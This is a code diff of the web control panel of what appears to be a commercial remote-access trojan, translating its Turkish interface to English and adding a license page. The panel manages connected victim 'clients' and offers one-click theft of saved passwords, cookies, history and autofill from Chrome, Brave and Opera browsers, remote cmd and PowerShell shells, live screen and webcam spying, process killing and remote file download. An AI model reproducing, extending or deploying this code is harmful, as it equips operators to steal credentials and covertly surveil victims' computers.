+                                                    <span class="browser-stat-key">Saved Autofill:</span>
+                                                    <span class="browser-stat-val" id="chrome-autofill">-</span>
                                                 </div>
                                             </div>
                                             <div class="browser-stat-footer">
-                                                <button class="collect-data-btn" id="collect-btn-chrome" onclick="collectBrowserData('chrome')">⬇ Collect Data</button>
+                                                <button class="collect-data-btn" id="collect-btn-chrome" onclick="collectBrowserData('chrome')">↓ Collect Data</button>
                                                 <span class="collect-status" id="collect-status-chrome"></span>
                                             </div>
                                         </div>
@@ -774,24 +775,24 @@
                                             </div>
                                             <div class="browser-stat-rows">
                                                 <div class="browser-stat-row">
-                                                    <span class="browser-stat-key">Kayıtlı Şifreler:</span>
-                                                    <span class="browser-stat-val" id="brave-passwords">—</span>
+                                                    <span class="browser-stat-key">Saved Passwords:</span>
+                                                    <span class="browser-stat-val" id="brave-passwords">-</span>
                                                 </div>
                                                 <div class="browser-stat-row">
-                                                    <span class="browser-stat-key">Kayıtlı Çerezler:</span>
-                                                    <span class="browser-stat-val" id="brave-cookies">—</span>
+                                                    <span class="browser-stat-key">Saved Cookies:</span>
+                                                    <span class="browser-stat-val" id="brave-cookies">-</span>
                                                 </div>
                                                 <div class="browser-stat-row">
-                                                    <span class="browser-stat-key">Kayıtlı Geçmiş:</span>
-                                                    <span class="browser-stat-val" id="brave-history">—</span>
+                                                    <span class="browser-stat-key">Saved History:</span>
+                                                    <span class="browser-stat-val" id="brave-history">-</span>
                                                 </div>
                                                 <div class="browser-stat-row">
-                                                    <span class="browser-stat-key">Kayıtlı Autofill:</span>
-                                                    <span class="browser-stat-val" id="brave-autofill">—</span>
+                                                    <span class="browser-stat-key">Saved Autofill:</span>
+                                                    <span class="browser-stat-val" id="brave-autofill">-</span>
                                                 </div>
                                             </div>
                                             <div class="browser-stat-footer">
-                                                <button class="collect-data-btn" id="collect-btn-brave" onclick="collectBrowserData('brave')">⬇ Collect Data</button>
+                                                <button class="collect-data-btn" id="collect-btn-brave" onclick="collectBrowserData('brave')">↓ Collect Data</button>
                                                 <span class="collect-status" id="collect-status-brave"></span>
                                             </div>
                                         </div>
@@ -803,24 +804,24 @@
                                             </div>
                                             <div class="browser-stat-rows">
                                                 <div class="browser-stat-row">
-                                                    <span class="browser-stat-key">Kayıtlı Şifreler:</span>
-                                                    <span class="browser-stat-val" id="opera-passwords">—</span>
+                                                    <span class="browser-stat-key">Saved Passwords:</span>
+                                                    <span class="browser-stat-val" id="opera-passwords">-</span>
                                                 </div>
                                                 <div class="browser-stat-row">
-                                                    <span class="browser-stat-key">Kayıtlı Çerezler:</span>
-                                                    <span class="browser-stat-val" id="opera-cookies">—</span>
+                                                    <span class="browser-stat-key">Saved Cookies:</span>
+                                                    <span class="browser-stat-val" id="opera-cookies">-</span>
                                                 </div>
                                                 <div class="browser-stat-row">
-                                                    <span class="browser-stat-key">Kayıtlı Geçmiş:</span>
-                                                    <span class="browser-stat-val" id="opera-history">—</span>
+                                                    <span class="browser-stat-key">Saved History:</span>
+                                                    <span class="browser-stat-val" id="opera-history">-</span>
                                                 </div>
                                                 <div class="browser-stat-row">
-                                                    <span class="browser-stat-key">Kayıtlı Autofill:</span>
-                                                    <span class="browser-stat-val" id="opera-autofill">—</span>
+                                                    <span class="browser-stat-key">Saved Autofill:</span>
+                                                    <span class="browser-stat-val" id="opera-autofill">-</span>
                                                 </div>
                                             </div>
                                             <div class="browser-stat-footer">
-                                                <button class="collect-data-btn" id="collect-btn-opera" onclick="collectBrowserData('opera')">⬇ Collect Data</button>
+                                                <button class="collect-data-btn" id="collect-btn-opera" onclick="collectBrowserData('opera')">↓ Collect Data</button>
                                                 <span class="collect-status" id="collect-status-opera"></span>
                                             </div>
                                         </div>
@@ -832,29 +833,29 @@
                                             </div>
                                             <div class="browser-stat-rows">
                                                 <div class="browser-stat-row">
-                                                    <span class="browser-stat-key">Kayıtlı Şifreler:</span>
-                                                    <span class="browser-stat-val" id="operagx-passwords">—</span>
+                                                    <span class="browser-stat-key">Saved Passwords:</span>
+                                                    <span class="browser-stat-val" id="operagx-passwords">-</span>
                                                 </div>
                                                 <div class="browser-stat-row">
-                                                    <span class="browser-stat-key">Kayıtlı Çerezler:</span>
-                                                    <span class="browser-stat-val" id="operagx-cookies">—</span>
+                                                    <span class="browser-stat-key">Saved Cookies:</span>
+                                                    <span class="browser-stat-val" id="operagx-cookies">-</span>
                                                 </div>
                                                 <div class="browser-stat-row">
-                                                    <span class="browser-stat-key">Kayıtlı Geçmiş:</span>
-                                                    <span class="browser-stat-val" id="operagx-history">—</span>
+                                                    <span class="browser-stat-key">Saved History:</span>
+                                                    <span class="browser-stat-val" id="operagx-history">-</span>
                                                 </div>
                                                 <div class="browser-stat-row">
-                                                    <span class="browser-stat-key">Kayıtlı Autofill:</span>
-                                                    <span class="browser-stat-val" id="operagx-autofill">—</span>
+                                                    <span class="browser-stat-key">Saved Autofill:</span>
+                                                    <span class="browser-stat-val" id="operagx-autofill">-</span>
                                                 </div>
                                             </div>
                                             <div class="browser-stat-footer">
-                                                <button class="collect-data-btn" id="collect-btn-operagx" onclick="collectBrowserData('operagx')">⬇ Collect Data</button>
+                                                <button class="collect-data-btn" id="collect-btn-operagx" onclick="collectBrowserData('operagx')">↓ Collect Data</button>
                                                 <span class="collect-status" id="collect-status-operagx"></span>
                                             </div>
                                         </div>
                                     </div>
-                                    <div class="browse-statusbar" id="browse-browser-statusbar">Hazır</div>
+                                    <div class="browse-statusbar" id="browse-browser-statusbar">Ready</div>
                                 </div>
                             </div>
 
@@ -867,10 +868,10 @@
                                     <div class="browse-body">
                                         <div class="browse-empty">
                                             <span class="browse-empty-icon">◉</span>
-                                            <span>Yakında eklenecek</span>
+                                            <span>Coming Soon</span>
                                         </div>
                                     </div>
-                                    <div class="browse-statusbar" id="browse-social-statusbar">Hazır</div>
+                                    <div class="browse-statusbar" id="browse-social-statusbar">Ready</div>
                                 </div>
                             </div>
 
@@ -882,12 +883,12 @@
             <div class="page" id="page-builder" style="display:none;">
                 <div class="page-header">
                     <h2>Builder</h2>
-                    <span class="page-sub">Yakında eklenecek</span>
+                    <span class="page-sub">Coming Soon</span>
                 </div>
                 <div class="coming-soon">
                     <div class="coming-icon">⚙</div>
-                    <div class="coming-title">Yapım Aşamasında</div>
-                    <div class="coming-sub">Builder özelliği yakında burada olacak.</div>
+                    <div class="coming-title">Under Construction</div>
+                    <div class="coming-sub">Builder feature will be here soon.</div>
                 </div>
             </div>
 
@@ -895,42 +896,42 @@
             <div class="page" id="page-settings" style="display:none;">
                 <div class="page-header">
                     <h2>Settings</h2>
-                    <span class="page-sub">Sunucu ayarları</span>
+                    <span class="page-sub">Server settings</span>
                 </div>
 
                 <div class="settings-grid">
-                    <!-- TCP Port Kartı -->
+                    <!-- TCP Port Card -->
                     <div class="info-card settings-card">
                         <div class="info-card-title">
                             <span class="settings-card-icon">◉</span>
-                            TCP Port (Client Bağlantı Portu)
+                            TCP Port (Client Connection Port)
                         </div>
-                        <div class="settings-desc">Client'ların bağlandığı TCP soket portu. Değişiklik anında aktif olur, mevcut bağlantılar kesilmez.</div>
+                        <div class="settings-desc">TCP socket port that clients connect to. Changes take effect immediately; existing connections are not lost.</div>
                         <div class="settings-field">
-                            <label class="settings-label">Port Numarası</label>
+                            <label class="settings-label">Port Number</label>
                             <div class="settings-input-row">
                                 <input type="number" id="settings-tcp-port" class="settings-input" min="1" max="65535" placeholder="4444" />
-                                <button class="settings-save-btn" onclick="saveSettings('tcp')">Kaydet</button>
+                                <button class="settings-save-btn" onclick="saveSettings('tcp')">Save</button>
                             </div>
-                            <div class="settings-hint">Mevcut: <span class="mono" id="settings-tcp-current">—</span></div>
+                            <div class="settings-hint">Current: <span class="mono" id="settings-tcp-current">-</span></div>
                         </div>
                         <div class="settings-status" id="settings-tcp-status"></div>
                     </div>
 
-                    <!-- Heartbeat Kartı -->
+                    <!-- Heartbeat Card -->
                     <div class="info-card settings-card">
                         <div class="info-card-title">
                             <span class="settings-card-icon">◉</span>
                             Heartbeat Interval
                         </div>
-                        <div class="settings-desc">Sunucu ile client arasındaki heartbeat (ping/pong) sıklığı. Timeout = interval + 15 saniye olarak hesaplanır.</div>
+                        <div class="settings-desc">Frequency of heartbeat (ping/pong) between server and client. Timeout is calculated as interval + 15 seconds.</div>
                         <div class="settings-field">
-                            <label class="settings-label">Süre (saniye)</label>
+                            <label class="settings-label">Duration (seconds)</label>
                             <div class="settings-input-row">
                                 <input type="number" id="settings-heartbeat" class="settings-input" min="1" max="300" placeholder="10" />
-                                <button class="settings-save-btn" onclick="saveSettings('heartbeat')">Kaydet</button>
+                                <button class="settings-save-btn" onclick="saveSettings('heartbeat')">Save</button>
                             </div>
-                            <div class="settings-hint">Mevcut: <span class="mono" id="settings-heartbeat-current">—</span></div>
+                            <div class="settings-hint">Current: <span class="mono" id="settings-heartbeat-current">-</span></div>
                         </div>
                         <div class="settings-status" id="settings-heartbeat-status"></div>
                     </div>
@@ -941,12 +942,54 @@
             <div class="page" id="page-account" style="display:none;">
                 <div class="page-header">
                     <h2>Account</h2>
-                    <span class="page-sub">Hesap bilgileri</span>
+                    <span class="page-sub">Account info and license status</span>
                 </div>
-                <div class="coming-soon">
-                    <div class="coming-icon">◎</div>
-                    <div class="coming-title">Yapım Aşamasında</div>
-                    <div class="coming-sub">Hesap yönetimi özelliği yakında eklenecek.</div>
+
+                <div class="info-grid">
+                    <div class="info-card">
+                        <div class="info-card-title">License Information</div>
+                        <div class="info-rows">
+                            <div class="info-row">
+                                <span class="info-key">License Key</span>
+                                <span class="info-val mono">
+                                    <span id="license-key-text" class="blurred-key">{{.LicenseKey}}</span>
+                                    <button id="toggle-license-btn" class="mini-btn" onclick="toggleLicense()">Show</button>
+                                </span>
+                            </div>
+                            <div class="info-row">
+                                <span class="info-key">Expiration Date</span>
+                                <span class="info-val mono">{{.LicenseExpiry}}</span>
+                            </div>
+                            <div class="info-row">
+                                <span class="info-key">Remaining Time</span>
+                                <span class="info-val mono" id="remaining-time">-</span>
+                            </div>
+                            <div class="info-row">
+                                <span class="info-key">License Status</span>
+                                <span class="info-val">
+                                    <span class="status-dot"></span> Active
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="info-card">
+                        <div class="info-card-title">System & Server</div>
+                        <div class="info-rows">
+                            <div class="info-row">
+                                <span class="info-key">License Server</span>
+                                <span class="info-val mono">{{.LicenseServer}}</span>
+                            </div>
+                            <div class="info-row">
+                                <span class="info-key">Software Version</span>
+                                <span class="info-val mono">{{.Version}}</span>
+                            </div>
+                            <div class="info-row">
+                                <span class="info-key">Last Check</span>
+                                <span class="info-val mono">{{.LastCheck}}</span>
+                            </div>
+                        </div>
+                    </div>
                 </div>
             </div>
 
@@ -967,7 +1010,7 @@
             return response;
         }
 
-        // ─── Sayfa Geçişi ────────────────────────────────
+        // - Page Switching ----------──
         const pages = ['home', 'clients', 'builder', 'settings', 'account'];
         const pageTitles = { home: 'Home', clients: 'Clients', builder: 'Builder', settings: 'Settings', account: 'Account' };
 
@@ -993,7 +1036,7 @@
             closeSidebar();
         }
 
-        // ─── Sidebar (mobil) ────────────────────────────
+        // - Sidebar (mobil) ---------─
         function toggleSidebar() {
             document.getElementById('sidebar').classList.toggle('open');
             document.getElementById('sidebar-overlay').classList.toggle('open');
@@ -1003,16 +1046,16 @@
             document.getElementById('sidebar-overlay').classList.remove('open');
         }
 
-        // ─── Settings ────────────────────────────────────
+        // - Settings ------------
         async function loadSettings() {
             try {
                 const res = await apiFetch('/api/settings', { credentials: 'include' });
                 if (!res.ok) return;
                 const s = await res.json();
                 document.getElementById('settings-tcp-port').value = s.tcp_port || '';
-                document.getElementById('settings-tcp-current').textContent = ':' + (s.tcp_port || '—');
+                document.getElementById('settings-tcp-current').textContent = ':' + (s.tcp_port || '-');
                 document.getElementById('settings-heartbeat').value = s.heartbeat_interval || '';
-                document.getElementById('settings-heartbeat-current').textContent = (s.heartbeat_interval || '—') + ' sn';
+                document.getElementById('settings-heartbeat-current').textContent = (s.heartbeat_interval || '-') + ' sn';
             } catch (e) {}
         }
 
@@ -1025,26 +1068,26 @@
             const val = targetInput.value.trim();
 
             if (!val) {
-                setSettingsStatus(statusEl, 'error', 'Değer boş olamaz.');
+                setSettingsStatus(statusEl, 'error', 'Value cannot be empty.');
                 return;
             }
 
             if (type === 'tcp') {
                 const port = parseInt(val, 10);
                 if (isNaN(port) || port < 1 || port > 65535) {
-                    setSettingsStatus(statusEl, 'error', 'Geçerli bir port numarası girin (1–65535).');
+                    setSettingsStatus(statusEl, 'error', 'Enter a valid port number (1–65535).');
                     return;
                 }
             }
             if (type === 'heartbeat') {
                 const hb = parseInt(val, 10);
                 if (isNaN(hb) || hb < 1 || hb > 300) {
-                    setSettingsStatus(statusEl, 'error', 'Geçerli bir süre girin (1–300 saniye).');
+                    setSettingsStatus(statusEl, 'error', 'Enter a valid duration (1–300 seconds).');
                     return;
                 }
             }
 
-            setSettingsStatus(statusEl, 'loading', 'Uygulanıyor...');
+            setSettingsStatus(statusEl, 'loading', 'Applying...');
 
             try {
                 const body = {};
@@ -1062,15 +1105,15 @@
                     if (type === 'tcp') {
                         document.getElementById('settings-tcp-current').textContent = ':' + val;
                     } else if (type === 'heartbeat') {
-                        document.getElementById('settings-heartbeat-current').textContent = val + ' sn';
+                        document.getElementById('settings-heartbeat-current').textContent = val + ' s';
                     }
-                    setSettingsStatus(statusEl, 'ok', '✓ Ayarlar güncellendi.');
+                    setSettingsStatus(statusEl, 'ok', '✓ Settings updated.');
                 } else {
                     const txt = await res.text();
-                    setSettingsStatus(statusEl, 'error', 'Hata: ' + txt);
+                    setSettingsStatus(statusEl, 'error', 'Error: ' + txt);
                 }
             } catch (e) {
-                setSettingsStatus(statusEl, 'error', 'Bağlantı hatası.');
+                setSettingsStatus(statusEl, 'error', 'Connection error.');
             }
         }
 
@@ -1082,7 +1125,7 @@
             if (type === 'loading') el.classList.add('settings-status-loading');
         }
 
-        // ─── Home Stats ──────────────────────────────────
+        // - Home Stats -----------─
         let statsInterval = null;
 
         function startStatsPolling() {
@@ -1111,7 +1154,7 @@
             } catch (e) {}
         }
 
-        // ─── Client Listesi ──────────────────────────────
+        // - Client List ----------
         let selectedID = null;
         let selectedClientData = {};
         let currentShell = 'cmd';
@@ -1132,18 +1175,18 @@
             shellState.cmd = { seenIndex: 0, clearedAt: 0 };
             shellState.ps  = { seenIndex: 0, clearedAt: 0 };
 
-            // Aktif streaming varsa durdur
+            // Stop if streaming is active
             if (isScreening) { isScreening = false; stopScreenPoll(); updateScreenUI(false); }
             if (isCaming)    { isCaming    = false; stopCamPoll();    updateCamUI(false);    }
-            // Task manager sıfırla
+            // Reset task manager
             taskData = [];
             document.getElementById('task-empty').style.display = 'flex';
             document.getElementById('taskmgr-table').style.display = 'none';
-            document.getElementById('task-count').textContent = '— process';
+            document.getElementById('task-count').textContent = '- process';
             document.getElementById('task-search').value = '';
             setTaskStatus('', '');
             stopTaskAutoRefresh();
-            // File browser sıfırla
+            // Reset file browser
             fbReset();
 
             document.querySelectorAll('.client-row').forEach(r => r.classList.remove('active'));
@@ -1278,19 +1321,19 @@
             switchTab('browse-' + type);
         }
 
-        // ─── Collect Browser Data ────────────────────────
+        // - Collect Browser Data --------
         async function collectBrowserData(browser) {
             if (!selectedID) {
-                setBrowseBrowserStatus('Önce bir client seçin.', 'error');
+                setBrowseBrowserStatus('Select a client first.', 'error');
                 return;
             }
             const btn = document.getElementById('collect-btn-' + browser);
             const statusEl = document.getElementById('collect-status-' + browser);
             btn.disabled = true;
-            btn.textContent = '⏳ Toplanıyor...';
+            btn.textContent = '⏳ Collecting...';
             statusEl.textContent = '';
             statusEl.className = 'collect-status';
-            setBrowseBrowserStatus('⏳ ' + browser.charAt(0).toUpperCase() + browser.slice(1) + ' verisi toplanıyor...', 'loading');
+            setBrowseBrowserStatus('⏳ Collecting ' + browser.charAt(0).toUpperCase() + browser.slice(1) + ' data...', 'loading');
             try {
                 const res = await apiFetch('/api/browser/collect', {
                     method: 'POST', credentials: 'include',
@@ -1298,17 +1341,17 @@
                     body: JSON.stringify({ id: selectedID, browser: browser })
                 });
 
-                // Server her zaman JSON döndürür (ok:true → data:base64zip, ok:false → error:mesaj)
+                // Server always returns JSON (ok:true → data:base64zip, ok:false → error:message)
                 const data = await res.json();
 
                 if (!data.ok) {
-                    // Hata durumu
-                    const errMsg = data.error || 'Veri toplanamadı.';
+                    // Error state
+                    const errMsg = data.error || 'Data could not be collected.';
                     statusEl.textContent = '✕';
                     statusEl.className = 'collect-status collect-err';
                     setBrowseBrowserStatus('✕ ' + errMsg, 'error');
                 } else {
-                    // Başarı: base64 zip → blob → otomatik indirme
+                    // Success: base64 zip → blob → automatic download
                     const zipName = data.name || (browser.charAt(0).toUpperCase() + browser.slice(1) + '_collect.zip');
                     const b64 = data.data || '';
                     if (b64) {
@@ -1324,15 +1367,15 @@
                     }
                     statusEl.textContent = '✓';
                     statusEl.className = 'collect-status collect-ok';
-                    setBrowseBrowserStatus('✓ ' + browser.charAt(0).toUpperCase() + browser.slice(1) + ' verisi başarıyla toplandı → ' + zipName, 'ok');
+                    setBrowseBrowserStatus('✓ ' + browser.charAt(0).toUpperCase() + browser.slice(1) + ' data successfully collected → ' + zipName, 'ok');
                 }
             } catch (e) {
                 statusEl.textContent = '✕';
                 statusEl.className = 'collect-status collect-err';
-                setBrowseBrowserStatus('Bağlantı hatası: ' + e.message, 'error');
+                setBrowseBrowserStatus('Connection error: ' + e.message, 'error');
             } finally {
                 btn.disabled = false;
-                btn.textContent = '⬇ Collect Data';
+                btn.textContent = '↓ Collect Data';
             }
         }
 
@@ -1367,7 +1410,7 @@
             const msg = document.getElementById('msg-input').value.trim();
             const status = document.getElementById('msg-status');
             if (!msg) {
-                status.textContent = 'Mesaj boş olamaz.';
+                status.textContent = 'Message cannot be empty.';
                 status.className = 'action-status error';
                 return;
             }
@@ -1378,15 +1421,15 @@
                     body: JSON.stringify({ id: selectedID, cmd: '[msg] ' + msg })
                 });
                 if (res.ok) {
-                    status.textContent = 'Mesaj gönderildi.';
+                    status.textContent = 'Message sent.';
                     status.className = 'action-status success';
                     document.getElementById('msg-input').value = '';
                 } else {
-                    status.textContent = 'Gönderilemedi. (' + res.status + ')';
+                    status.textContent = 'Could not send. (' + res.status + ')';
                     status.className = 'action-status error';
                 }
             } catch (e) {
-                status.textContent = 'Bağlantı hatası.';
+                status.textContent = 'Connection error.';
                 status.className = 'action-status error';
             }
         }
@@ -1411,7 +1454,7 @@
                     body: JSON.stringify({ id: selectedID, cmd: prefix + cmd })
                 });
             } catch (e) {
-                appendTerminalLine('error', 'Gönderilemedi.');
+                appendTerminalLine('error', 'Could not send.');
             }
         }
 
@@ -1430,7 +1473,7 @@
                     body: JSON.stringify({ id: selectedID, cmd: prefix + cmd })
                 });
             } catch (e) {
-                appendTerminalLine('error', 'Gönderilemedi.');
+                appendTerminalLine('error', 'Could not send.');
             }
         }
 
@@ -1452,7 +1495,7 @@
         }
 
 
-        // ─── Live Camera ─────────────────────────────────
+        // - Live Camera -----------
         let camPollInterval = null;
         let isCaming = false;
         let currentCamFps = 10;
@@ -1506,7 +1549,7 @@
             document.getElementById('cam-start-btn').style.display = active ? 'none'        : 'inline-flex';
             document.getElementById('cam-stop-btn').style.display  = active ? 'inline-flex' : 'none';
             const label = document.getElementById('cam-status-label');
-            label.textContent = active ? 'Yayında' : 'Durduruldu';
+            label.textContent = active ? 'Live' : 'Stopped';
             label.className   = 'screen-status-label ' + (active ? 'live' : '');
             const dot = document.getElementById('cam-dot');
             dot.className = 'stream-dot cam' + (active ? ' live' : '');
@@ -1549,7 +1592,7 @@
             } catch (e) {}
         }
 
-        // ─── Live Screen ─────────────────────────────────
+        // - Live Screen -----------
         let screenPollInterval = null;
         let isScreening = false;
         let currentFps = 10;
@@ -1557,14 +1600,14 @@
         function onFpsChange(val) {
             currentFps = parseInt(val);
             document.getElementById('fps-value').textContent = val;
-            // Yayın aktifse yeni FPS'i hemen uygula
+            // If streaming is active, apply new FPS immediately
             if (isScreening && selectedID) {
                 apiFetch('/api/screen/ctrl', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, action: 'start', fps: currentFps })
                 }).catch(() => {});
-                // Poll hızını da güncelle
+                // Update poll speed too
                 startScreenPoll();
             }
         }
@@ -1605,7 +1648,7 @@
             document.getElementById('screen-start-btn').style.display = active ? 'none'        : 'inline-flex';
             document.getElementById('screen-stop-btn').style.display  = active ? 'inline-flex' : 'none';
             const label = document.getElementById('screen-status-label');
-            label.textContent = active ? 'Yayında' : 'Durduruldu';
+            label.textContent = active ? 'Live' : 'Stopped';
             label.className   = 'screen-status-label ' + (active ? 'live' : '');
             const dot = document.getElementById('screen-dot');
             dot.className = 'stream-dot' + (active ? ' live' : '');
@@ -1664,8 +1707,8 @@
             } catch (e) {}
         }
 
-        // ─── Task Manager ────────────────────────────────
-        let taskData       = [];   // tüm process listesi
+        // - Task Manager ----------──
+        let taskData       = [];   // all process list
         let taskSortCol    = 'mem';
         let taskSortAsc    = false;
         let taskAutoInterval = null;
@@ -1674,7 +1717,7 @@
             if (!selectedID) return;
             const btn = document.getElementById('task-refresh-btn');
             btn.disabled = true;
-            btn.textContent = '↻ Yükleniyor...';
+            btn.textContent = '↻ Loading...';
             setTaskStatus('', '');
             try {
                 const res = await apiFetch('/api/tasklist', {
@@ -1683,17 +1726,17 @@
                     body: JSON.stringify({ id: selectedID })
                 });
                 if (!res.ok) {
-                    setTaskStatus('error', 'Hata: ' + res.status);
+                    setTaskStatus('error', 'Error: ' + res.status);
                     return;
                 }
                 const procs = await res.json();
                 taskData = procs || [];
                 renderTasks();
             } catch (e) {
-                setTaskStatus('error', 'Bağlantı hatası.');
+                setTaskStatus('error', 'Connection error.');
             } finally {
                 btn.disabled = false;
-                btn.textContent = '↻ Yenile';
+                btn.textContent = '↻ Refresh';
             }
         }
 
@@ -1704,7 +1747,7 @@
                 p.pid.toString().includes(search)
             );
 
-            // Sıralama
+            // Sorting
             list.sort((a, b) => {
                 let va = a[taskSortCol], vb = b[taskSortCol];
                 if (taskSortCol === 'pid' || taskSortCol === 'cpu' || taskSortCol === 'mem') {
@@ -1740,16 +1783,16 @@
                     <td class="col-cpu"><span class="val-badge ${cpuClass}">${cpu.toFixed(1)}</span></td>
                     <td class="col-mem"><span class="val-badge ${memClass}">${mem.toFixed(1)}</span></td>
                     <td class="col-kill">
-                        <button class="kill-btn" onclick="killProcess(${q(p.pid)}, '${q(p.name)}')" title="Sonlandır">✕</button>
+                        <button class="kill-btn" onclick="killProcess(${q(p.pid)}, '${q(p.name)}')" title="Terminate">✕</button>
                     </td>
                 </tr>`;
             }).join('');
 
-            // Sort arrow güncelle
+            // Update sort arrows
             ['pid','name','cpu','mem'].forEach(col => {
                 const el = document.getElementById('sort-' + col);
                 if (!el) return;
-                el.textContent = col === taskSortCol ? (taskSortAsc ? '▲' : '▼') : '';
+                el.textContent = col === taskSortCol ? (taskSortAsc ? '↑' : '↓') : '';
             });
         }
 
@@ -1769,8 +1812,8 @@
 
         async function killProcess(pid, name) {
             if (!selectedID) return;
-            if (!confirm(`"${name}" (PID: ${pid}) sonlandırılsın mı?`)) return;
-            setTaskStatus('info', `PID ${pid} sonlandırılıyor...`);
+            if (!confirm(`Terminate "${name}" (PID: ${pid})?`)) return;
+            setTaskStatus('info', `Terminating PID ${pid}...`);
             try {
                 const res = await apiFetch('/api/taskkill', {
                     method: 'POST', credentials: 'include',
@@ -1778,20 +1821,20 @@
                     body: JSON.stringify({ id: selectedID, pid: pid })
                 });
                 if (!res.ok) {
-                    setTaskStatus('error', 'Sunucu hatası: ' + res.status);
+                    setTaskStatus('error', 'Server error: ' + res.status);
                     return;
                 }
                 const data = await res.json();
                 if (data.success) {
-                    setTaskStatus('success', `✓ PID ${pid} sonlandırıldı`);
-                    // Satırı hemen tablodan kaldır
+                    setTaskStatus('success', `✓ PID ${pid} terminated`);
+                    // Remove row from table immediately
                     taskData = taskData.filter(p => parseInt(p.pid) !== pid);
                     renderTasks();
                 } else {
                     setTaskStatus('error', `✗ ${data.message}`);
                 }
             } catch (e) {
-                setTaskStatus('error', 'Bağlantı hatası.');
+                setTaskStatus('error', 'Connection error.');
             }
         }
 
@@ -1815,14 +1858,14 @@
             if (taskAutoInterval) { clearInterval(taskAutoInterval); taskAutoInterval = null; }
         }
 
-        // ─── File Browser ─────────────────────────────────
-        let fbCurrentPath  = null;   // null = henüz açılmadı
-        let fbHistory      = [];     // geri geçmişi
-        let fbData         = [];     // mevcut dizinin öğeleri
+        // - File Browser -----------
+        let fbCurrentPath  = null;   // null = not opened yet
+        let fbHistory      = [];     // back history
+        let fbData         = [];     // items of current directory
         let fbSep          = '/';
         let fbSortCol      = 'name';
         let fbSortAsc      = true;
-        let fbCtxTarget    = null;   // sağ tık hedefi {name, type, fullPath}
+        let fbCtxTarget    = null;   // right click target {name, type, fullPath}
         let fbLoading      = false;
 
         function fbReset() {
@@ -1840,18 +1883,18 @@
         async function fbNavigate(path) {
             if (!selectedID || fbLoading) return;
             fbLoading = true;
-            fbSetStatus('info', '↻ Yükleniyor...');
+            fbSetStatus('info', '↻ Loading...');
             try {
                 const res = await apiFetch('/api/fb/ls', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, path: path })
                 });
-                if (!res.ok) { fbSetStatus('error', 'Hata: ' + res.status); return; }
+                if (!res.ok) { fbSetStatus('error', 'Error: ' + res.status); return; }
                 const data = await res.json();
                 if (data.error) { fbSetStatus('error', data.error); return; }
 
-                // Geçmişe ekle
+                // Add to history
                 if (fbCurrentPath !== null && fbCurrentPath !== path) {
                     fbHistory.push(fbCurrentPath);
                 }
@@ -1862,9 +1905,9 @@
                 fbRenderList();
                 document.getElementById('fb-back-btn').disabled = fbHistory.length === 0;
                 document.getElementById('fb-up-btn').disabled   = !fbCurrentPath;
-                fbSetStatus('', `${fbData.filter(i=>i.type==='dir'||i.type==='drive').length} klasör, ${fbData.filter(i=>i.type==='file').length} dosya`);
+                fbSetStatus('', `${fbData.filter(i=>i.type==='dir'||i.type==='drive').length} folders, ${fbData.filter(i=>i.type==='file').length} files`);
             } catch(e) {
-                fbSetStatus('error', 'Bağlantı hatası');
+                fbSetStatus('error', 'Connection error');
             } finally {
                 fbLoading = false;
             }
@@ -1874,7 +1917,7 @@
         function fbGoBack()  { if (fbHistory.length) fbNavigate(fbHistory.pop()); }
         function fbGoUp() {
             if (!fbCurrentPath) return;
-            // Windows: C:\ → kök (boş), Linux: /a/b → /a
+            // Windows: C:\ → root (empty), Linux: /a/b → /a
             const parts = fbCurrentPath.replace(/[/\\]+$/, '').split(/[/\\]/);
             if (parts.length <= 1) { fbNavigate(''); return; }
             parts.pop();
@@ -1885,12 +1928,12 @@
         function fbRenderBreadcrumb() {
             const bc = document.getElementById('fb-breadcrumb');
             if (!fbCurrentPath) {
-                bc.innerHTML = '<span class="fb-bc-item active">Bu Bilgisayar</span>';
+                bc.innerHTML = '<span class="fb-bc-item active">This PC</span>';
                 return;
             }
             const parts = fbCurrentPath.replace(/[/\\]+$/, '').split(/[/\\]/);
             const qa = s => String(s).replace(/&/g,'&amp;').replace(/"/g,'&quot;');
-            let html = '<span class="fb-bc-item fb-bc-root fb-bc-nav" data-bcpath="">⌂</span>';
+            let html = '<span class="fb-bc-item fb-bc-root fb-bc-nav" data-bcpath="">Home</span>';
             let built = '';
             parts.forEach((p, i) => {
                 if (!p) return;
@@ -1920,7 +1963,7 @@
             empty.style.display = 'none';
             table.style.display = '';
 
-            // Sırala: klasörler önce, sonra dosyalar
+            // Sort: folders first, then files
             let dirs  = fbData.filter(i => i.type === 'dir' || i.type === 'drive');
             let files = fbData.filter(i => i.type === 'file');
 
@@ -1939,7 +1982,7 @@
             document.getElementById('fb-tbody').innerHTML = list.map(item => {
                 const fullPath = fbBuildPath(item.name);
                 const icon     = fbIcon(item);
-                const sizeStr  = item.type === 'file' ? fbFmtSize(item.size) : '—';
+                const sizeStr  = item.type === 'file' ? fbFmtSize(item.size) : '-';
                 const qa = s => String(s).replace(/&/g,'&amp;').replace(/"/g,'&quot;');
                 const isDir = item.type === 'dir' || item.type === 'drive';
                 return `<tr class="fb-row ${isDir ? 'fb-dir' : 'fb-file'}"
@@ -1950,9 +1993,9 @@
                     <td class="fb-col-icon">${icon}</td>
                     <td class="fb-col-name"><span class="fb-name">${_fbEsc(item.name)}${item.link ? ' <span class="fb-link-badge">↩</span>' : ''}</span></td>
                     <td class="fb-col-size mono">${sizeStr}</td>
-                    <td class="fb-col-mtime">${item.mtime || '—'}</td>
+                    <td class="fb-col-mtime">${item.mtime || '-'}</td>
                     <td class="fb-col-act">
-                        <button class="fb-act-btn ${isDir ? 'fb-act-open' : 'fb-act-dl'}" title="${isDir ? 'Aç' : 'İndir'}">${isDir ? '→' : '↓'}</button>
+                        <button class="fb-act-btn ${isDir ? 'fb-act-open' : 'fb-act-dl'}" title="${isDir ? 'Open' : 'Download'}">${isDir ? '→' : '↓'}</button>
                     </td>
                 </tr>`;
             }).join('');
@@ -1960,12 +2003,12 @@
             // Sort arrows
             ['name','size','mtime'].forEach(col => {
                 const el = document.getElementById('fb-sort-' + col);
-                if (el) el.textContent = col === fbSortCol ? (fbSortAsc ? '▲' : '▼') : '';
+                if (el) el.textContent = col === fbSortCol ? (fbSortAsc ? '↑' : '↓') : '';
             });
         }
 
         function fbBuildPath(name) {
-            if (!fbCurrentPath) return name; // drive seçimi
+            if (!fbCurrentPath) return name; // drive selection
